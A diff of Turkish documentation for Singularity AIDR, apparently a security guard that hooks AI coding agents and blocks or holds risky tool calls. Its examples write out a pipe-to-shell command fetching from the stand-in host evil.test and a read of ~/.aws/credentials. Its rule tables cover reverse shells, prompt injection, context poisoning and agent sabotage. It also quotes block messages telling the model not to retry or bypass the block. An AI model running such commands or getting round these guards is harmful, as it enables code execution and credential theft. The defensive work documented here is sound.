@@ -12,8 +12,10 @@ Bu rehber güvenlik yöneticileri (CISO), güvenlik mühendisleri, BT yöneticil
 alma ekipleri için hazırlanmıştır. Yapay zekâ ajanı ürün hattının her özelliğini; ne
 yaptığını, neden önemli olduğunu, nasıl çalıştığını, nasıl etkinleştirileceğini ve
 sınırlarını anlatır. Aşağıdaki tüm komutlar, yapılandırma anahtarları ve dosya yolları
-doğrudan kod deposundan alınmıştır. Ürünün kullanıcıya gösterdiği mesajlar İngilizcedir;
-örneklerde bu mesajlar özgün hâliyle verilmiştir.
+doğrudan kod deposundan alınmıştır. Engelleme ve onay mesajları, `aidr` komut satırı
+çıktısı ve panel Türkçe ve İngilizce gösterilir (dil `AIDR_LOCALE`, yapılandırmadaki
+`locale` ya da sistem dili ile seçilir); örneklerde Türkçe hâlleri verilmiştir. Henüz
+çevrilmemiş birkaç ayrıntı mesajı özgün İngilizce hâliyle verilmiştir.
 
 > **Sürüm durumu.** Singularity AIDR henüz canlı pilot ya da üretim dağıtımı için
 > yayımlanmamıştır; sürüm kaydı:
@@ -25,7 +27,8 @@ doğrudan kod deposundan alınmıştır. Ürünün kullanıcıya gösterdiği me
 > yoktur ve hiçbir kayıt Windows, macOS, arm64, imzalı bir sürüm ya da gerçek bir modeli
 > kapsamaz. Aşağıdaki yetenekleri, yazılımın tasarlanmış ve test edilmiş davranışı olarak
 > değerlendirin; bu kayıtların ötesinde host tarafında kabul edilmiş bir garanti olarak
-> değil.
+> değil. Connector başına test edilmiş host sürümleri
+> [uyumluluk matrisindedir](../../../compatibility-matrix.md).
 
 ## İçindekiler
 
@@ -86,10 +89,24 @@ doğrudan kod deposundan alınmıştır. Ürünün kullanıcıya gösterdiği me
 | VS Code | aynı eklenti paketi | `UserPromptSubmit`, `PreToolUse`, `PostToolUse` (Claude tarzı hook'lar) | `Bash`, `WebFetch`, `Write`, `Edit`, `Read`, `Delete`, `editFiles` | `PostToolUse` (çalıştıktan sonra, içerik değiştirmez) | Host'a bağlı |
 | OpenClaw | `@singularityrd/aidr-openclaw` | Süreç içi `before_tool_call` ve `before_agent_run` plugin hook'ları | `exec`, `web_fetch`, `write`, `edit`, `read`, `apply_patch` | Transkript ve giden mesaj değiştirme | Yok, `aidr approve` ile operatör onayı |
 | OpenCode | `@singularityrd/aidr-opencode` | `tool.execute.before` ve `chat.message` plugin hook'ları | `bash`, `webfetch`, `read`, `write`, `edit`, `apply_patch`, `ls`, `glob`, `grep` | `tool.execute.after` ile değiştirme | Yok, `aidr approve` ile operatör onayı |
-| Codex CLI | `@singularityrd/aidr-codex` | Yerel `PreToolUse` ve `UserPromptSubmit` komut hook'ları | `Bash`, `apply_patch` (matcher `^(Bash|apply_patch)$`) | Denetlenmez | Yok, `ask` → `deny`, `aidr approve` ile operatör onayı |
+| Codex CLI | `@singularityrd/aidr-codex` | Yerel `PreToolUse`, `UserPromptSubmit` ve `PostToolUse` komut hook'ları | `Bash`, `apply_patch`, MCP çağrıları (matcher `^(Bash|apply_patch|mcp__.+)$`) | `Bash` ve MCP sonuçları için `PostToolUse` engeli (çalıştıktan sonra) | Yok, `ask` → `deny`, `aidr approve` ile operatör onayı |
 
 Her connector ayrıca kullanıcının prompt'unu modele ulaşmadan önce denetler; bkz.
 [Prompt koruması](#prompt-koruması).
+
+**Windows ve Linux'ta kurulum.** Masaüstü kurulum dosyaları (imzalı MSI, `.deb`, `.rpm` ve
+tarball; panelin **İndirmeler** sayfasından indirilir) tek parça bir `aidr` programını,
+tehdit kurallarını ve sürüm anahtarını taşır ve kullanıcı için `aidr setup` çalıştırır.
+Kurulum, bulduğu her araç için Claude Code ve Codex hook'larını, OpenCode paketini ve
+OpenClaw eklentisini kaydeder; Cursor ve VS Code için kurulum dosyasındaki eklentileri
+kurar. Henüz hiçbiri kurulu değilse hiçbir şeyi değiştirmez ve `3` çıkış koduyla biter
+(hata değildir). Ardından yapay zekâ araçlarını yeniden başlatıp `aidr status` ve
+`aidr verify` çalıştırın. Kurulum dosyasıyla kurulan uç noktalar `aidr update` ile
+güncellenir: imzalı katalog ve kurulum dosyasının SHA-256 değeri doğrulanır, `aidr verify`
+çalıştırılır, sorun çıkarsa eski sürüm geri yüklenir (`update.auto`: varsayılan `notify`).
+macOS için kurulum dosyası sunulmaz; macOS'ta aşağıdaki connector paketlerini kullanın.
+Elle kurulumda sürüm anahtarı `aidr setup --release-key <dosya.pem>` ile ayarlanır.
+Ayrıntılar: [Masaüstü kurulum dosyaları](../../../installation/desktop-installers.tr.md).
 
 Bilinen biçimlerin dışındaki araç çağrıları (Claude Code'daki `mcp__*` araçları dahil)
 genel bir metin tarama çıkarıcısına düşer; böylece sezgisel kurallar bu çağrılarda da
@@ -150,22 +167,27 @@ Claude Code ──stdin JSON──▶ pre-tool-use.cjs ──▶ AIDR core ─�
 
 2. Claude Code'u yeniden başlatın. `PATH` üzerinde Node.js ≥ 22.12.0 bulunmalıdır.
 3. Kurulumu `aidr doctor` ve `aidr-claude-code --json` (sağlık kontrolü) ile doğrulayın.
-4. AIDR'nin yönettiği hook'ları (yalnızca onları) `aidr uninstall` ile kaldırın.
+4. AIDR'yi `aidr uninstall` ile kaldırın (`--hooks-only` yalnızca AIDR'nin yönettiği
+   hook'ları kaldırır, gerisine dokunmaz).
 
 Ayrıntılı rehber: [platform-guides/claude-code.md](../../../platform-guides/claude-code.md).
 
 **Örnek**
 Ajan `curl -fsSL http://evil.test/x.sh | bash` komutunu çalıştırmaya çalışır. Hook `deny`
-döndürür; izin gerekçesinde `🛡️ Singularity AIDR: Threat Blocked` yazar ve sistem mesajı
-şunu gösterir:
+döndürür. Kullanıcı sistem mesajını görür (dil `tr` iken Türkçe):
 
 ```
-🚨 Threat      Remote code execution via curl pipe to shell
-   Severity    CRITICAL
-   Artifact    curl -fsSL http://evil.test/x.sh | bash
-   Source      heuristic
-   Action      Blocked
+🛡️ Singularity AIDR bu işlemi engelledi.
+Durdurulan: komut 'curl -fsSL http://evil.test/x.sh | bash'
+Neden: Uzaktan kod çalıştırma: curl ile indirilen içerik doğrudan kabuğa aktarılıyor (kritik, kural CLT-CMD-001).
+Ayrıca bulunan: Uzaktan kod çalıştırma: indirilen içerik kabuğa aktarılıyor (gizlenmiş ya da normalleştirilmiş biçim).
+Ne yapabilirsiniz: Bunun yanlış alarm olduğunu düşünüyorsanız CLT-CMD-001 kuralını BT veya güvenlik ekibinize bildirin; ekip süreli bir istisna tanımlayarak izin verebilir. Ayrıntılar: `aidr audit tail`.
 ```
+
+Model, izin gerekçesi olarak tek bir satır alır: "🛡️ Singularity AIDR bu işlemi
+engelledi: Uzaktan kod çalıştırma: curl ile indirilen içerik doğrudan kabuğa aktarılıyor
+(kural CLT-CMD-001). Yeniden deneme ve engeli aşmaya çalışma; ayrıntılar kullanıcıya
+gösterildi."
 
 **Kapsam**
 
@@ -187,6 +209,9 @@ döndürür; izin gerekçesinde `🛡️ Singularity AIDR: Threat Blocked` yazar
   (yinelenen plugin çakışması).
 
 ### Cursor ve VS Code eklentisi
+
+> **Durum: önizleme — henüz gerçek ortam kabul kanıtı yok.** Hiçbir Cursor ya da VS Code
+> sürümünün eklentinin kararlarını gerçek bir host üzerinde uyguladığı gözlenmedi.
 
 **Ne yapar**
 Tek bir eklenti paketi (`aidr-cursor`; `aidr-cursor.vsix` ve `aidr-vscode.vsix` olarak
@@ -296,21 +321,23 @@ dışarıya giden bir mesaja taşınabilir; bu connector her iki sınırı da iz
 Ayrıntılı rehber: [platform-guides/openclaw.md](../../../platform-guides/openclaw.md).
 
 **Örnek**
-Ajan `exec` ile `cat ~/.aws/credentials` çalıştırmak ister. Çağrı engellenir ve model şu
-yanıtı alır:
+Ajan `exec` ile `cat ~/.aws/credentials` çalıştırmak ister. Çağrı engellenir ve mesaj
+şöyledir (gizli bilgi bulgusunda dosyanın değeri hiçbir zaman gösterilmez):
 
 ```
-Singularity AIDR flagged this action and blocked it pending explicit user approval.
-Severity: warning
-Category: secrets
-Reason: Reading credential or secret file
-...
-Approval reference: actionId: "<actionId>"
-You cannot approve this action yourself and no tool available to you can approve it.
+🛡️ Singularity AIDR bu işlemi siz onaylayana kadar durdurdu.
+Bir kez izin vermek için kendi terminalinizde şunu çalıştırın (15 dakika geçerli), sonra yapay zekâ aracından yeniden denemesini isteyin:
+  aidr approve 3f9c2a7b
+Neden: Kimlik bilgisi ya da gizli bilgi içeren dosyayı okuma (yüksek, kural CLT-CRED-004).
+Ayrıca bulunan: Kimlik bilgisi ya da ortam (env) dosyasına erişim.
+Ayrıntılar: `aidr pending`. Bunun yanlış alarm olduğunu düşünüyorsanız CLT-CRED-004 kuralını BT veya güvenlik ekibinize bildirin.
+Onay referansı: 3f9c2a7be41d08c5…
+Yapay zekâ aracı için: Bu işlemi kendin onaylayamazsın ve erişebildiğin hiçbir araç onaylayamaz. Kullanıcıya neyin durdurulduğunu ve nasıl izin verebileceğini söyle, sonra dur: bu çağrıyı yeniden deneme ve engeli aşmaya çalışma.
 ```
 
-Kullanıcı çağrıyı `aidr pending` ile inceler ve uygun görürse kendi terminalinde
-`aidr approve <actionId>` komutunu çalıştırır.
+Kullanıcı kendi terminalinde `aidr approve 3f9c2a7b` (kimliğin ilk 8 karakteri yeterlidir)
+ya da numaralı listeden seçmek için yalnızca `aidr approve` çalıştırır, `approve` yazar ve
+yapay zekâ aracından yeniden denemesini ister.
 
 **Kapsam**
 
@@ -443,9 +470,26 @@ codex (PreToolUse) ──stdin JSON──▶ aidr-codex-hook ──▶ AIDR core
 
    ```toml
    [[hooks.PreToolUse]]
-   matcher = "^(Bash|apply_patch)$"
+   matcher = "^(Bash|apply_patch|mcp__.+)$"
 
    [[hooks.PreToolUse.hooks]]
+   type = "command"
+   command = "aidr-codex-hook"
+   timeout = 10
+
+   # İstem koruması. Matcher yok: Codex bu olayda matcher'ı yok sayar.
+   [[hooks.UserPromptSubmit]]
+
+   [[hooks.UserPromptSubmit.hooks]]
+   type = "command"
+   command = "aidr-codex-hook"
+   timeout = 10
+
+   # Araç çıktısı denetimi.
+   [[hooks.PostToolUse]]
+   matcher = "^(Bash|mcp__.+)$"
+
+   [[hooks.PostToolUse.hooks]]
    type = "command"
    command = "aidr-codex-hook"
    timeout = 10
@@ -459,10 +503,10 @@ Ayrıntılı rehber: [platform-guides/codex.md](../../../platform-guides/codex.m
 [packages/codex/README.md](../../../../packages/codex/README.md).
 
 **Örnek**
-Codex `cat ~/.aws/credentials` önerir. AIDR'nin kararı `ask`'tir; Codex, gerekçesinde onay
-referansı bulunan bir `permissionDecision: "deny"` alır. Operatör `aidr approve <actionId>`
-komutunu çalıştırır ve aynı Codex oturumundaki bir sonraki birebir aynı çağrı bir kez
-serbest bırakılır.
+Codex `cat ~/.aws/credentials` önerir. AIDR'nin kararı `ask`'tir; Codex, ilk adımı
+çalıştırılacak komut olan engelleme mesajıyla (örneğin `aidr approve 3f9c2a7b`) bir
+`permissionDecision: "deny"` alır. Kullanıcı komutu kendi terminalinde çalıştırır ve aynı
+Codex oturumundaki bir sonraki birebir aynı çağrı bir kez serbest bırakılır.
 
 **Kapsam**
 
@@ -490,7 +534,7 @@ serbest bırakılır.
 **Ne yapar**
 Motor her araç çağrısından artifact'ları (komutlar, URL'ler, dosya yolları, içerik,
 paketler) çıkarır ve bunları YAML tehdit kurallarıyla eşleştirir. Kurallar kod değil,
-veridir: [`threats/`](../../../../threats/) altında **29 dosyada 494 kural** bulunur ve
+veridir: [`threats/`](../../../../threats/) altında **31 dosyada 519 kural** bulunur ve
 Linux, macOS ile Windows'u kapsar.
 
 **Neden önemli**
@@ -509,54 +553,62 @@ denetim kaydı → karar
 
 Her kuralda `id`, `category`, `severity`, `confidence` (0–1), `action` (`block` → `deny`,
 `require_approval` → `ask`, `log` → `allow`), regex `pattern`, `match_on`, `title`,
-`expires_at` ve `revoked` alanları bulunur. 494 kuralın 211'i engeller, 255'i onay ister,
-28'i yalnızca kayıt tutar; 168'i critical, 299'u high, 27'si medium önem derecesindedir.
+`expires_at` ve `revoked` alanları bulunur. 519 kuralın 225'i engeller, 266'sı onay ister,
+28'i yalnızca kayıt tutar; 180'i critical, 312'si high, 27'si medium önem derecesindedir.
 `secure-code.yaml` içindeki 27 kural tavsiye niteliğindedir: yalnızca ajanın yazdığı kodu
 inceler ve eşleşmede ne olacağını `secure_code.action` (varsayılan `warn` ya da `ask`) belirler.
+`script-content.yaml` içindeki 5 kural komut çalıştırma kalıplarını ajanın yazdığı betiklere
+taşır: bir shell betiğine, Dockerfile'a, Makefile'a, CI iş akışına, git hook'una ya da
+`package.json` script'ine yazılan `curl … | bash` onaya bekletilir (reverse shell
+engellenir); aynı satır bir README'de izinli kalır. Ayrıntılar:
+[threat-rules.md](../../../threat-rules.md#commands-written-into-scripts).
 
 Kural dosyaları:
 
 | Dosya | Kapsam | Kural |
 | --- | --- | --- |
-| `commands.yaml` | Tehlikeli komutlar: pipe-to-shell, reverse shell, yıkıcı işlemler | 31 |
-| `credentials.yaml` | Kimlik bilgisi ifşası | 8 |
+| `commands.yaml` | Tehlikeli komutlar: pipe-to-shell, reverse shell, yıkıcı işlemler | 39 |
+| `credentials.yaml` | Kimlik bilgisi ifşası | 11 |
 | `files.yaml` | Hassas dosya yolları | 19 |
-| `persistence.yaml` | cron, systemd, shell RC, LaunchAgents | 7 |
-| `obfuscation.yaml` | Kodlama ve gizleme teknikleri | 8 |
-| `supply_chain.yaml` | Tedarik zinciri kalıpları | 1 |
+| `persistence.yaml` | cron, systemd, shell RC, LaunchAgents | 8 |
+| `obfuscation.yaml` | Kodlama ve gizleme teknikleri | 12 |
+| `supply_chain.yaml` | Tedarik zinciri kalıpları | 2 |
 | `urls.yaml` | Kötü amaçlı URL ve alan adı kalıpları | 5 |
 | `mining.yaml` | Kripto madenciliği / kaynak gaspı (ATT&CK T1496) | 17 |
 | `self-defense.yaml` | AIDR'yi devre dışı bırakma veya atlatma girişimleri | 9 |
 | `canary.yaml` | Ajanın AIDR tuzak (canary) kimlik bilgisi yönetimini kullanması | 1 |
+| `credential-reads.yaml` | Dolaylı okumalarla erişilen kimlik bilgisi depoları (tarayıcı profilleri, gcloud token'ları, GnuPG anahtarları) | 3 |
 | `mitre.yaml` | MITRE ATT&CK teknik eşlemeleri | 64 |
 | `llm-threats.yaml` | LLM'e özgü tehditler | 21 |
 | `skill-scan.yaml` | Skill/plugin paketi kuralları T01–T09 | 26 |
 | `ai-supply-chain.yaml` | Güvensiz model yükleme ve doğrulanmamış model kaynakları | 14 |
 | `secure-code.yaml` | Ajanın yazdığı güvensiz kod (güvenli kod korumaları) | 27 |
+| `script-content.yaml` | Betiklere yazılan pipe-to-shell, reverse shell ve kodlanmış yük çalıştırma (shell, PowerShell, batch, Dockerfile, Makefile, CI/git hook dosyaları, package.json script'leri) | 5 |
 | `context-poisoning.yaml` | Veri ve bağlam zehirleme: ajan talimat, bellek, yapılandırma ve MCP dosyası yazımları, gizli veya enjekte talimatlar, MCP araç zehirleme, bellek deposu yazımları | 23 |
 | `agent-safety.yaml` | Yapay zekâ güvenliği korkulukları: ödül istismarı ve sabotaj, özerklik yükseltme, geri alınamaz eylemler | 43 |
 | `mac-commands.yaml`, `mac-credentials.yaml`, `mac-files.yaml`, `mac-obfuscation.yaml`, `mac-persistence.yaml`, `mac-supply-chain.yaml` | macOS varyantları | 27 + 8 + 10 + 7 + 9 + 3 = 64 |
 | `win-commands.yaml`, `win-credentials.yaml`, `win-files.yaml`, `win-obfuscation.yaml`, `win-persistence.yaml`, `win-supply-chain.yaml` | Windows varyantları | 61 + 10 + 10 + 16 + 8 + 1 = 106 |
-| **Toplam** | 29 dosya | **494** |
+| **Toplam** | 31 dosya | **519** |
 
 Kategoriye göre kurallar:
 
 | Kategori grubu | Kategoriler (kural sayısı) | Kural |
 | --- | --- | --- |
-| Araç kötüye kullanımı | `tool` | 185 |
-| Gizli bilgiler ve kimlik bilgileri | `secrets` | 50 |
-| MITRE ATT&CK eşlemeli | `credential_access` (16), `defense_evasion` (14), `persistence` (10), `discovery` (9), `exfiltration` (4), `lateral_movement` (4), `execution` (2), `reconnaissance` (2), `command_and_control` (1), `privilege_escalation` (1), `collection` (1) | 64 |
+| Araç kötüye kullanımı | `tool` | 196 |
+| Gizli bilgiler ve kimlik bilgileri | `secrets` | 55 |
+| MITRE ATT&CK eşlemeli | `credential_access` (17), `defense_evasion` (15), `persistence` (11), `discovery` (9), `exfiltration` (4), `lateral_movement` (4), `execution` (2), `reconnaissance` (2), `command_and_control` (1), `privilege_escalation` (1), `collection` (1) | 67 |
 | Skill ve plugin paketleri | 14 `skill_*` kategorisi (talimat ele geçirme, Unicode kaçakçılığı, bellek zehirleme, uzak payload, gömülü kod, kimlik bilgisi sızdırma, aşırı yetki, yetki yükseltme, kimlik bilgisine erişim, kalıcılık, araç ele geçirme, güvensiz bağımlılık, koda gömülü gizli bilgi, güvensiz kodlama) | 26 |
 | LLM tehditleri | `prompt_injection` (5), `tool_misuse` (4), `indirect_prompt_injection` (3), `prompt_extraction` (3), `information_disclosure` (2), `memory_poisoning` (2), `content_safety` (2) | 21 |
 | Kaynak gaspı | `resource_hijacking` | 17 |
 | Ağ çıkışı | `network_egress` | 9 |
 | Öz savunma | `self_defense` | 10 |
-| Tedarik zinciri | `supply_chain` | 5 |
+| Tedarik zinciri | `supply_chain` | 6 |
 | Yapay zekâ model tedarik zinciri | `ai_supply_chain` | 14 |
+| Betik içeriği | `script_content` | 5 |
 | Güvenli kod | `secure_code_tls` (6), `secure_code_sql_injection` (5), `secure_code_weak_crypto` (4), `secure_code_cors` (3), `secure_code_code_injection` (2), `secure_code_command_injection` (2), `secure_code_permissions` (2), `secure_code_debug_exposure` (2), `secure_code_csrf` (1) | 27 |
 | Bağlam zehirleme | `context_poisoning` (14), `context_poisoning_hidden_unicode` (3), `mcp_tool_poisoning` (3), `memory_poisoning` (2), `context_poisoning_permission_widening` (1) | 23 |
 | Yapay zekâ güvenliği | `reward_hacking` (17), `irreversible_action` (14), `autonomy_escalation` (7), `agent_sabotage` (5) | 43 |
-| **Toplam** | | **494** |
+| **Toplam** | | **519** |
 
 Müşteriler kendi kurallarını `~/.singularity-aidr/threats/*.yaml` altına ekleyebilir; aynı
 `id`'ye sahip özel bir kural yerleşik kuralın yerine geçer.
@@ -700,12 +752,13 @@ kullanıcı ne görür ve kararı kim geçersiz kılabilir.
 | Karar | Anlamı | Ne olur |
 | --- | --- | --- |
 | `allow` | Tehdit tespit edilmedi | Çağrı herhangi bir çıktı olmadan devam eder (destekleyen host'larda DLP maskelemesi varsa maskelenmiş girdiyle). |
-| `ask` | Şüpheli; insan kararı gerekir | **Bant dışı** insan onayına kadar engelleme. Claude Code ve VS Code host diyaloğunu gösterir; Cursor `preToolUse` ve Codex `deny` alır; OpenClaw ve OpenCode çağrıyı engeller ve modele bir `actionId` verir. |
+| `ask` | Şüpheli; insan kararı gerekir | Bir kişi ajanın dışında onaylayana kadar engelleme. Claude Code ve VS Code host'un kendi onay penceresini (Evet / Hayır) gösterir; Cursor `preToolUse` ve Codex `deny` alır; OpenClaw, OpenCode ve Codex kullanıcının kendi terminalinde çalıştıracağı komutu (`aidr approve <kimliğin ilk 8 karakteri>`) gösterir. |
 | `deny` | Doğrulanmış tehdit | Connector engelleme döndürür. Operatörler bir `deny` kararını serbest bırakamaz. |
 
-Hiçbir connector ajana bir onay aracı sunmaz. Model `actionId`'yi engelleme gerekçesinde
-aldığı için, ajanın çağırabileceği bir onay aracı prompt injection'a uğramış bir ajanın
-kendi engellemesini onaylamasına imkân verirdi.
+Hiçbir connector ajana bir onay aracı sunmaz. Modelin aldığı engelleme mesajında onay
+kimliği yazar ve işlemi kendisinin onaylayamayacağı söylenir; bu yüzden ajanın
+çağırabileceği bir onay aracı, prompt injection'a uğramış bir ajanın kendi engellemesini
+onaylamasına imkân verirdi.
 
 **Nasıl kullanılır**
 Kararlar yapılandırma gerektirmez. Kararları `aidr audit tail`, bekleyen onay isteklerini
@@ -715,13 +768,11 @@ Kararlar yapılandırma gerektirmez. Kararları `aidr audit tail`, bekleyen onay
 Claude Code'da `cat ~/.aws/credentials` → yerel onay diyaloğu:
 
 ```
-🛡️ Singularity AIDR: Suspicious Activity Detected
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ Threat      Reading credential or secret file
-   Severity    WARNING
-   Artifact    cat ~/.aws/credentials
-   Source      heuristic
-   Action      Requires confirmation
+🛡️ Singularity AIDR bu işlemi siz onaylayana kadar durdurdu.
+Bir kez izin vermek için Evet'i, engelli kalması için Hayır'ı seçin.
+Neden: Kimlik bilgisi ya da gizli bilgi içeren dosyayı okuma (yüksek, kural CLT-CRED-004).
+Ayrıca bulunan: Kimlik bilgisi ya da ortam (env) dosyasına erişim.
+Ayrıntılar: `aidr pending`. Bunun yanlış alarm olduğunu düşünüyorsanız CLT-CRED-004 kuralını BT veya güvenlik ekibinize bildirin.
 ```
 
 **Kapsam**
@@ -733,8 +784,9 @@ Claude Code'da `cat ~/.aws/credentials` → yerel onay diyaloğu:
 **Sınırlamalar**
 - Bir karar, host'un onu ne ölçüde uyguladığı kadar güçlüdür
   ([fail-closed davranışı](#connector-bazında-fail-closed-davranışı) bölümüne bakın).
-- İtibar kontrolleri kapalıyken (varsayılan), URL içeren veya paket kuran çağrılar hiçbir
-  kural tetiklenmese bile `ask` olur (sonraki bölüm).
+- İtibar kontrolleri kapalıyken (varsayılan), URL içeren veya paket kuran çağrılar
+  yalnızca yerel kurallarla karara bağlanır ve `reputation_not_checked` olarak kaydedilir
+  (sonraki bölüm).
 
 ### URL, dosya ve paket itibar kontrolleri
 
@@ -751,10 +803,13 @@ kötü amaçlı olduğu bilinen bir paket arşivi, bir regex için zararsız gö
   asla gönderilmez; sorgu parametreleri yalnızca `include_query_parameters: true` ile).
 - `file_check`: yalnızca SHA-256 özetlerini gönderir.
 - `package_check`: paket adlarını npm/PyPI'ya gönderir.
-- Üçü de **varsayılan olarak kapalıdır** (`enabled: false`). Kapalı, erişilemeyen veya
-  yalnızca kısmen yanıt veren bir kontrol görünür bir kapsama boşluğudur: normalde izin
-  verilecek bir çağrı "URL reputation lookup was unavailable … NOT verified clean and
-  require review" gibi bir gerekçeyle `ask` olur. Hiçbir zaman temiz olarak raporlanmaz.
+- Üçü de **varsayılan olarak kapalıdır** (`enabled: false`). Kontrol kapalıyken çağrı
+  yerel kurallarla karara bağlanır ve `reputation_not_checked` olarak kaydedilir
+  (denetlenmedi; asla "temiz" değil); `url_check.unchecked_action` /
+  `package_check.unchecked_action: "ask"` bu çağrıları incelemeye bekletir. Açık olup
+  erişilemeyen ya da yalnızca kısmen yanıt veren bir kontrol görünür bir kapsama
+  boşluğudur: normalde izin verilecek bir çağrı, temiz olduğunun doğrulanmadığını söyleyen
+  bir gerekçeyle `ask` olur. Hiçbir zaman temiz olarak raporlanmaz.
 - Bu kontroller, dağıtılmış birinci taraf bir itibar uç noktası gerektirir
   (`url_check.endpoint`, `file_check.endpoint`; örneğin kendi barındırdığınız bir Supabase
   Edge Function). Böyle bir uç nokta yoksa bu kontroller etkisizdir.
@@ -772,8 +827,12 @@ kötü amaçlı olduğu bilinen bir paket arşivi, bir regex için zararsız gö
 Dışarıya veri akışı açmadan önce [privacy.md](../../../privacy.md) belgesini okuyun.
 
 **Örnek**
-Varsayılan ayarlarla `WebFetch https://docs.example.com/guide`, URL doğrulanamadığı için
-`url_reputation_unavailable` kategorisiyle `ask` döndürür.
+Varsayılan ayarlarla `WebFetch https://docs.example.com/guide` yerel kurallarla karara
+bağlanır: `reputation_not_checked` kategorisiyle `allow` döndürür; bu kategori URL'yi hiçbir
+itibar servisinin kontrol etmediğini kaydeder (temiz sonuç değildir).
+`url_check.unchecked_action: "ask"` ayarıyla `url_reputation_unavailable` kategorisiyle
+`ask` döndürür. Açık olup yanıt veremeyen bir itibar ayağı da
+`url_reputation_unavailable` ile `ask` döndürür.
 
 **Kapsam**
 
@@ -784,8 +843,10 @@ Varsayılan ayarlarla `WebFetch https://docs.example.com/guide`, URL doğrulanam
 **Sınırlamalar**
 - Etkinleştirildiğinde URL kontrolü URL'nin tamamını (özetini değil) gönderir.
 - Dağıtılmış bir uç nokta olmadan kontrolleri açmak doğrulanmış sonuç üretmez.
-- Varsayılan olarak kapalı kontroller, URL ve paket içeren çağrılarda daha fazla `ask`
-  kararı demektir; allowlist ve onay sürecini buna göre planlayın.
+- Kontroller kapalıyken (varsayılan), hiçbir yerel kuralın işaretlemediği URL ve paket
+  içeren çağrılar denetlenmeden devam eder (`reputation_not_checked`); incelenmeleri
+  gerekiyorsa `unchecked_action: "ask"` ayarlayın ve allowlist ile onay sürecini buna göre
+  planlayın.
 
 ### Paket tedarik zinciri kontrolleri
 
@@ -816,8 +877,10 @@ Ayrıntılar: [package-protection.md](../../../package-protection.md).
 
 **Örnek**
 Paket kontrolleri açıkken, npm'de bulunmayan bir ad için `npm install lodahs` reddedilir.
-Paket kontrolleri kapalıyken (varsayılan) aynı komut `ask` olur: "Package check for
-'lodahs' is disabled … NOT verified clean and requires review".
+Paket kontrolleri kapalıyken (varsayılan) çevrim dışı typosquat denetimi aynı komutu `ask`
+yapar: "'lodahs' paketi, yaygın kullanılan npm paketi 'lodash' adına çok benziyor (tek
+karakter farklı) ve taklit bir paket (typosquat) olabilir. Kurmadan önce adı kontrol edin.
+…"
 
 **Kapsam**
 
@@ -1340,7 +1403,7 @@ tanımı, kullanıcı daha hiçbir şey yazmadan ajanı yönlendirebilir.
 
 | Durum | Karar |
 | --- | --- |
-| Korunan bir dosyaya sıradan yazma (`CTX-PATH-001` ile `-007` arası) | `ask`: bir operatör bant dışı onaylayana kadar engellenir |
+| Korunan bir dosyaya sıradan yazma (`CTX-PATH-001` ile `-007` arası) | `ask`: bir kişi kendi terminalinde onaylayana kadar engellenir |
 | Yazılan içerik talimat gizliyor (görünmez Unicode, çift yönlü ya da sıfır genişlikli karakterler) ya da talimat enjekte ediyor (geçersiz kılma, gizleme, sızdırma, anahtar okuma) | `deny` |
 | Bir ayar yazımı otomatik onayı açıyor, izinleri atlıyor ya da hook'ları kapatıyor (`CTX-CFG-001`) | `deny` |
 | Okunan içerikte gizli etiket karakteri metni ya da sıfır genişlikli yük | Çıktı modelden engellenir |
@@ -1395,7 +1458,7 @@ veri kaybı olaylarıdır.
 
   | Mod | Kaynak | İmza |
   | --- | --- | --- |
-  | `managed` | `~/.singularity-aidr/detectors/<runtime>.json` (runtime: `claude-code`, `cursor`, `vscode`, `openclaw`, `opencode`, `codex`); kontrol panelinde **Policies** altında hazırlanır | Ed25519 ile imzalı, doğrulanmış kiracı yetkisine (entitlement) bağlı; imzasız veya değiştirilmiş paketler araç çağrılarını engeller |
+  | `managed` | `~/.singularity-aidr/detectors/<runtime>.json` (runtime: `claude-code`, `cursor`, `vscode`, `openclaw`, `opencode`, `codex`); kontrol panelinde **Ekip politikası** altında hazırlanır | Ed25519 ile imzalı, doğrulanmış kiracı yetkisine (entitlement) bağlı; imzasız veya değiştirilmiş paketler araç çağrılarını engeller |
   | `local` | `~/.singularity-aidr/dlp-policy.json` (veya `AIDR_DLP_POLICY_PATH`) | İmzasız; makinenin operatörü tarafından yazılır |
 
 - **Eşleştiriciler.** `keyword` (en fazla 500 değer), `regex` (en fazla 512 karakter;
@@ -1458,7 +1521,7 @@ Yerel mod için örnek bir `~/.singularity-aidr/dlp-policy.json`:
 
 Durumu `aidr doctor` veya
 `aidr-claude-code health --check local_dlp_policy --json` ile kontrol edin. Yönetilen modda
-politikayı kontrol panelinde (**Policies**) hazırlayın; imzalı paketi kontrol düzlemi
+politikayı kontrol panelinde (**Ekip politikası**) hazırlayın; imzalı paketi kontrol düzlemi
 dağıtır.
 
 **Örnek**
@@ -1651,17 +1714,20 @@ bir onay isteği** olarak kaydedilir. Bir insan operatör bunu kendi terminalind
 
 **Neden önemli**
 Onay, denetlenen ajanın yapamayacağı bir eylem olmalıdır. Ajan bir onay aracını
-çağırabilseydi, bir prompt injection kendi engellemesini onaylayabilirdi. Operatör kanalı
-onayı bant dışında tutar.
+çağırabilseydi, bir prompt injection kendi engellemesini onaylayabilirdi. Onayı yalnızca
+bir kişi, kendi terminalinde ya da panelde verebilir.
 
 **Nasıl çalışır**
 1. Connector bekleyen isteği `~/.singularity-aidr/approvals.json` dosyasına yazar: `actionId`
    (araç, girdi ve oturumun SHA-256 özeti), artifact kümesinin özeti, araç, connector,
    maskelenmiş bir özet ve bir saatlik geçerlilik süresi. Ham değerler ve oturum kimliği
    saklanmaz.
-2. `aidr pending` açık istekleri listeler; `aidr approve <actionId>` neyin serbest
+2. `aidr pending` açık istekleri listeler. `aidr approve <kimlik>` (kimliğin tamamı ya da
+   ilk 8+ karakteri; engelleme mesajı bu komutu zaten gösterir) neyin serbest
    bırakılacağını gösterir ve operatörün etkileşimli bir terminalde `approve` yazmasını
-   ister.
+   ister. Terminalde kimliksiz `aidr approve`, bekleyen istekleri numaralı listeler ve
+   birini seçtirir. Birden fazla isteğe uyan kısa kimlik reddedilir; `--yes` kimliğin
+   tamamını ister.
 3. Onay 15 dakika sonra sona erer (`--ttl <minutes>`, 1–1440) ve **tek kullanımlıktır**:
    birebir aynı ilk yeniden deneme (aynı araç, artifact'lar ve oturum) onu tüketir. `deny`
    kararları (paranoid modda yükseltilmiş `ask` dahil) hiçbir zaman serbest bırakılmaz.
@@ -1678,26 +1744,28 @@ onayı bant dışında tutar.
 
 ```bash
 aidr pending
-aidr approve <actionId>                    # etkileşimli, "approve" yazılır
-aidr approve <actionId> --ttl 5 --json     # daha kısa süre, makine tarafından okunabilir makbuz
